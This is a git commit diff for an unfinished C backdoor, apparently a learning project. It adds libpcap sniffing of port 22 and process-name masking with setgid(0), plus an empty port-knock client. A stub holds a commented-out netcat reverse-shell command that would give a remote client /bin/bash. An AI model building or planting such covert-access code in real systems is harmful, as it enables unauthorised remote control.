f8b8fd2f67bf85a0a9c6f74d5ebdab3108874cf8
opk1 <dsathanielle@gmail.com>
2015-05-24 02:54:43 -0700

    capturing packets with pcap library
    TODO: - listen for knock on server
    - send knock from client

--- src/backdoor.c
+++ src/backdoor.c
@@ -1,12 +1,28 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/prctl.h>
 
+#include <net/ethernet.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <pcap.h>
+
 
 
 #define MASK "BACKDOOR"
+/*-----------------------------------------------------------------------------------------------
+-- FUNCTION:   mask_application(char *name)
+--             name - 
+--
+-- REVISIONS:  
+--
+-- RETURNS:    none
+--
+-- NOTES:      Process incoming packets to look for secret knock.
+--------------------------------------------------------------------------------------------------*/
 void mask_application(char *name)
 {
 	memset(name, 0, strlen(name));
@@ -17,14 +33,112 @@ void mask_application(char *name)
 	setgid(0);
 }
 
+/*-----------------------------------------------------------------------------------------------
+-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+--             args - 
+--             header - 
+--             packet
+--
+-- REVISIONS:  
+--
+-- RETURNS:    none
+--
+-- NOTES:      Process incoming packets to look for secret knock.
+--------------------------------------------------------------------------------------------------*/
+void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+{
+	int size = header->len;
 
+	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
+
+
+	// if knock... execute_backdoor
+}
+
+/*-----------------------------------------------------------------------------------------------
+-- FUNCTION:   process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+--             args - 
+--             header - 
+--             packet
+--
+-- REVISIONS:  
+--
+-- RETURNS:    none
+--
+-- NOTES:      Process incoming packets to look for secret knock.
+--------------------------------------------------------------------------------------------------*/
+void execute_backdoor(char *addr, int port)
+{
+	// send shell to client
+	//system("nc %s %d -e /bin/bash", addr, port);
+
+}
+
+/*-----------------------------------------------------------------------------------------------
+-- FUNCTION:   main
+--
+-- REVISIONS:  
+--
+-- RETURNS:    none
+--
+-- NOTES:      
+--------------------------------------------------------------------------------------------------*/
 int main(int argc, char *argv[])
 {
+	char *dev;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	char filter_exp[] = "port 22";  // filter expression
+	const u_char *packet;
+
+	struct bpf_program fp;  // compiled filter expression
+	struct pcap_pkthdr header;
+
+	pcap_t *handle;         // session handle
+	bpf_u_int32 mask;       // netmask
+	bpf_u_int32 net;        // ip of dev
+	
+
 	mask_application(argv[0]);
 
+	dev = "wlan0"; //pcap_lookupdev(errbuf);
+	if(dev == NULL)
+	{
+		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
+		return(2);
+	}
+	printf("Device: %s\n", dev);
 
+	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
+	{
+		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+		net = 0;
+		mask = 0;
+	}
 
-	while(1){}
+	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if(handle == NULL)
+	{
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(2);
+	}
+
+	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
+	{
+		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(2);
+	}
+
+	if(pcap_setfilter(handle, &fp) == -1)
+	{
+		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(2);
+	}
+
+	// rcv_packet will be called every time a packet is captured
+	pcap_loop(handle, -1, process_packet, NULL);
+
+	pcap_freecode(&fp);
+	pcap_close(handle);
 
 	return 0;
 
---
+++ src/client.c
@@ -0,0 +1,21 @@
+#include <stdio.h>
+
+
+void send_knock()
+{
+
+
+}
+
+void wait_for_response()
+{
+
+	
+}
+
+int main(int argc, char *argv[])
+{
+
+
+	return 0;
+}
